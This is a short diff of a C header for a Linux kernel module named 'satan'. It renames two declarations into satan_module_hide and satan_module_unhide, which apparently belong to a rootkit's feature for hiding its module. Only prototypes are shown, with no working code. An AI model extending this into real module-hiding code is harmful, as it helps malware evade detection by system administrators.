@@ -4,7 +4,7 @@
 
 #include <linux/types.h>
 
-bool satan_is_hidden(void);
-void satan_set_hidden(bool hidden);
+void satan_module_hide(void);
+void satan_module_unhide(void);
 
 #endif  // SATAN_MODULE_H_
